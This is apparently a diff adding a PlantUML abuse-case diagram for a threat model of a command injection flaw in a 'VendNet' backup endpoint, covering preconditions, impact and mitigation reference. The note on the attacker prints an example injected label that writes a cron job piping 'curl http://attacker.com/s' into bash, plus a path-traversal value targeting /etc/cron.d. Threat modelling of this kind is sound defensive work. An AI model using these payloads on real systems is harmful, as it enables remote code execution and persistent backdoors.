@@ -1,0 +1,63 @@
+@startuml AC-01_OS_Command_Injection
+
+title AC-01 — OS Command Injection via ProcessBuilder Backup Endpoint\nSTRIDE: Tampering | Severity: Critical | Mitigation: M-01
+
+left to right direction
+
+skinparam usecase {
+  BackgroundColor<< abuse >> #FFCCCC
+  BorderColor<< abuse >> #CC0000
+  FontColor<< abuse >> #CC0000
+  BackgroundColor<< normal >> #DDEEFF
+  BorderColor<< normal >> #336699
+  BackgroundColor<< impact >> #FFF3CD
+  BorderColor<< impact >> #856404
+}
+skinparam actorBackgroundColor #EEF
+skinparam actorBorderColor #336699
+skinparam noteFontSize 10
+
+actor "Administrator\n(Legitimate)" as admin #DDEEFF
+actor "Malicious Admin /\nCompromised Account" as attacker #FFCCCC
+
+rectangle "VendNet System" {
+  usecase "Trigger On-Demand\nBackup" as UC1 << normal >>
+  usecase "Inject OS Command\nvia Backup Label Parameter" as AC1 << abuse >>
+  usecase "Execute Arbitrary\nOS Command as Service Account" as AC1b << abuse >>
+  usecase "Establish Persistent\nReverse Shell / Cron Backdoor" as AC1c << abuse >>
+}
+
+admin --> UC1
+
+attacker --> AC1
+AC1 ..> UC1       : <<threatens>>
+AC1 ..> AC1b      : <<extends>>
+AC1b ..> AC1c     : <<extends>>
+
+note right of AC1
+  **Preconditions:**
+  • Valid Administrator-scoped JWT
+  • POST /admin/backups accepts
+    user-supplied label field
+  • Label appended to ProcessBuilder
+    args without allowlist sanitisation
+  • Service account has write access
+    to /var/vendnet/ and beyond
+end note
+
+note right of AC1c
+  **Impact:**
+  Integrity: audit logs overwritten,
+  DB records modified via MySQL creds
+  Availability: service killed / disk filled
+  Business: full system compromise,
+  GDPR Art. 33 notification required
+end note
+
+note bottom of attacker
+  **Attack vector:**
+  {"label":"daily\\n* * * * * root curl http://attacker.com/s | bash"}
+  or path traversal: {"label":"../../../../etc/cron.d/vendnet_persist"}
+end note
+
+@enduml
